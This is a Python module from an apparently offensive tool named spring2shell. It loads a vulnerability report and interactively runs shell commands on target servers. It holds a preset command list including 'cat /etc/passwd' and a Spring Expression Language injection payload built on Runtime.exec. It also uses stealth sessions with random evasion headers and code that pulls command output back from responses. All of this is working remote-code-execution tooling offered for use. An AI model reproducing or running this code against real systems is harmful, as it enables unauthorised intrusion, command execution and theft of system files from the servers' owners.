"""
Report loading and interactive exploitation for spring2shell.

Provides:
- load_report_and_exploit(): load JSON report and interactively drive exploitation
- interactive_exploitation_menu(): let the user pick a vulnerability from a list
- exploitation_command_menu():     let the user pick or type a command
"""

from __future__ import annotations

import json
import sys
from pathlib import Path
from typing import Any

from spring2shell.utils.logging import log_event
import logging

_PRESET_COMMANDS = ["id", "whoami", "ls -la", "pwd", "cat /etc/passwd", "ps aux", "uname -a"]


def interactive_exploitation_menu(vulnerabilities: list[dict[str, Any]]) -> dict[str, Any] | None:
    """Display a numbered list of *vulnerabilities* and let the user pick one.

    Args:
        vulnerabilities: List of finding dicts that have ``status == confirmed|unverified``.

    Returns:
        Selected finding dict, or ``None`` if the user typed ``back`` or ``exit``.
    """
    if not vulnerabilities:
        print("[!] No vulnerabilities available for exploitation")
        return None

    print("\n" + "=" * 70)
    print("EXPLOITATION MENU")
    print("=" * 70)
    for i, vuln in enumerate(vulnerabilities, 1):
        status = vuln.get("status", vuln.get("vulnerable", "Unknown"))
        url = vuln.get("url", "N/A")
        endpoint = vuln.get("endpoint", "N/A")
        cve = vuln.get("cve", "")
        cve_str = f"  [{cve}]" if cve else ""
        print(f"{i}. [{status}]{cve_str} {url}\n   Endpoint: {endpoint}")

    print("\nCommands: [number] — Select    back — Return    exit — Exit")
    while True:
        try:
            choice = input("\nSelect > ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return None
        if choice == "back":
            return None
        elif choice == "exit":
            print("[+] Exiting...")
            sys.exit(0)
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(vulnerabilities):
                return vulnerabilities[idx]
            else:
                print("[!] Invalid selection — enter a number between 1 and "
                      f"{len(vulnerabilities)}")
        else:
            print("[!] Invalid input")


def exploitation_command_menu() -> str:
    """Let the user pick a preset command or type a custom one.

    Returns:
        Selected command string, or 'back'/'exit'.
    """
    print("\n" + "=" * 50)
    print("EXPLOITATION COMMANDS")
    print("=" * 50)
    for i, cmd in enumerate(_PRESET_COMMANDS, 1):
        print(f"{i}. {cmd}")
    print(f"{len(_PRESET_COMMANDS)+1}. custom — enter your own command")
    print("\nOr type a command directly.")

    while True:
        try:
            choice = input("\nSelect command (number or command) > ").strip()
        except (EOFError, KeyboardInterrupt):
            return "back"
        if choice.lower() in ("back", "exit"):
            return choice.lower()
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(_PRESET_COMMANDS):
                return _PRESET_COMMANDS[idx]
            elif idx == len(_PRESET_COMMANDS):
                try:
                    return input("Enter custom command: ").strip()
                except (EOFError, KeyboardInterrupt):
                    return "back"
            else:
                print("[!] Invalid selection")
        elif choice:
            return choice
        else:
            print("[!] Empty input")


def load_report_and_exploit(report_file: str) -> None:
    """Load a JSON report and drive exploitation interactively.

    The report must be a file produced by :func:`~core.reporter.write_report`.
    The user can select any vulnerability, pick a command, and watch the
    exploitation attempt.

    Args:
        report_file: Path to the JSON report file.
    """
    try:
        data = json.loads(Path(report_file).read_text())
    except FileNotFoundError:
        print(f"[!] Report file not found: {report_file}")
        return
    except json.JSONDecodeError:
        print(f"[!] Invalid JSON in report file: {report_file}")
        return
    except Exception as exc:
        print(f"[!] Error loading report: {exc}")
        return

    # Support both old (results list) and new (findings key) schemas
    findings = data.get("findings", data.get("results", []))
    vulnerabilities = [
        f for f in findings
        if f.get("status") in ("confirmed", "unverified", "Confirmed", "Unverified", "Potential")
        or f.get("vulnerable")
    ]

    if not vulnerabilities:
        print(f"[!] No vulnerabilities found in report: {report_file}")
        return

    print(f"\n[+] Loaded report: {report_file}")
    print(f"[+] Found {len(vulnerabilities)} vulnerabilities")

    while True:
        vuln = interactive_exploitation_menu(vulnerabilities)
        if not vuln:
            break

        cmd_choice = exploitation_command_menu()
        if cmd_choice in ("back", "exit"):
            if cmd_choice == "exit":
                sys.exit(0)
            continue

        # Lazy import to keep startup fast
        from spring2shell.core.verifier import (
            _build_payload_from_template,
            _send_payload_request,
            _strict_verify_execution,
        )
        from spring2shell.core.session import create_stealth_session
        from spring2shell.evasion.headers import get_random_headers

        target_url = vuln.get("url", "")
        endpoint = vuln.get("endpoint", target_url)
        method = vuln.get("method", "POST")
        payload_template = vuln.get("payload", vuln.get("payload_used"))

        session = create_stealth_session()
        headers = get_random_headers()

        unique_marker = f"RCE_LOAD_{__import__('random').randint(10000, 99999)}"
        command_attempts = [
            f'sh -c "echo {unique_marker}; {cmd_choice}; echo {unique_marker}"',
            f'/bin/sh -c "echo {unique_marker}; {cmd_choice}; echo {unique_marker}"',
            f'cmd /c "echo {unique_marker} & {cmd_choice} & echo {unique_marker}"',
            cmd_choice,
        ]

        response = None
        used_command = None
        for attempt_command in command_attempts:
            payload = _build_payload_from_template(payload_template, attempt_command)
            if not payload:
                from spring2shell.core.verifier import _escape_java_string
                escaped = _escape_java_string(attempt_command)
                payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"  }}'
            try:
                used_command = attempt_command
                response = _send_payload_request(session, endpoint, method, headers.copy(), payload)
                if response.status_code in (200, 400, 500):
                    break
            except Exception:
                response = None

        if response is None:
            print("[!] Exploitation failed — no response")
        else:
            print(f"\n[+] Status: {response.status_code}  Size: {len(response.text)} chars")
            if unique_marker in response.text:
                import re
                pattern = f"{re.escape(unique_marker)}(.*?){re.escape(unique_marker)}"
                match = re.search(pattern, response.text, re.DOTALL)
                if match:
                    output = match.group(1).strip()
                    print(f"\n[!] RCE CONFIRMED — output:\n{'-'*50}\n{output[:2000]}")
                else:
                    print(f"[!] Marker found but output extraction failed")
            else:
                print(f"[+] Response preview:\n{'-'*50}\n{response.text[:500]}")

        try:
            cont = input("\nContinue exploitation? (yes/no): ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            break
        if cont not in ("yes", "y"):
            break
